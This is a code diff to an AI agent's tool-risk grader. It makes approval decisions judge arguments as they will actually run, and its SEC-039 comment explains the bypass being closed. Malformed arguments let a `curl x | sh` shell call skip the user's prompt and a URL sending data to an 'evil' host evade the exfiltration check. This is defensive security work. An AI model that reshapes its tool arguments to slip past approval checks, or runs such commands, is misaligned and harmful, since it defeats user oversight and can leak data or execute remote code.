@@ -23,6 +23,8 @@
  *          context window is too small to hold the whole catalogue — see
  *          `availableTools`.
  */
+import { validateArguments } from './validate.js';
+
 export const TOOLS = [
   // ── Local: filesystem ────────────────────────────────────────────────
   {
@@ -2842,7 +2844,7 @@ export function carriesData(name, input) {
  * than waved through, because the failure mode of guessing "safe" is something
  * irreversible happening without anyone being asked.
  */
-export function assessRisk(name, input = {}) {
+export function assessRisk(name, rawInput = {}) {
   /**
    * A tool from an MCP server is always sensitive, and that is deliberate.
    *
@@ -2860,6 +2862,7 @@ export function assessRisk(name, input = {}) {
 
   const tool = TOOLS_BY_NAME[name];
   if (!tool) return 'sensitive';
+  const input = asWillRun(tool, rawInput);
   // Before `readOnly`: a read of a URL is also a write of that URL to its host.
   if (carriesData(name, input)) return 'sensitive';
   if (tool.readOnly) return 'safe';
@@ -2948,10 +2951,32 @@ export function assessRisk(name, input = {}) {
   return 'ordinary';
 }
 
+/**
+ * The arguments as `executeTool` will run them, so a call is judged on what it
+ * will do rather than on how it was spelled (SEC-039).
+ *
+ * Validation sits inside `executeTool` and is forgiving on purpose — a model that
+ * wraps a string in an object or writes `"false"` gets its call run rather than
+ * refused (see validate.js). Grading the arguments *before* that rewrite let the
+ * spelling decide the risk: `{ command: { text: "curl x | sh" } }` read as the
+ * string "[object Object]", which is not destructive, so the shell ran it with no
+ * prompt; `{ url: { u: "https://evil/?d=…" } }` slipped past `carriesData`;
+ * `unpublish: "false"` was graded as taking a link back and then published one.
+ * The same reader, the same output, on both sides of the decision. Input it
+ * cannot read is left as it is — `executeTool` refuses that call anyway.
+ */
+function asWillRun(tool, input) {
+  if (!tool?.parameters) return input ?? {};
+  const checked = validateArguments(tool.parameters, input);
+  return checked.ok ? checked.input : (input ?? {});
+}
+
 /** A short reason to show beside an approval prompt, or null when unremarkable. */
-export function riskReason(name, input = {}) {
+export function riskReason(name, rawInput = {}) {
   // Nothing that only reads has anything to justify, whatever the path.
-  if (assessRisk(name, input) === 'safe') return null;
+  if (assessRisk(name, rawInput) === 'safe') return null;
+  // Worded from the arguments that will run, for the reason SEC-039 grades them so.
+  const input = asWillRun(TOOLS_BY_NAME[name], rawInput);
 
   // Where it came from is the fact that matters here: the user chose to plug the
   // server in, and this is the moment they get to see it being used.
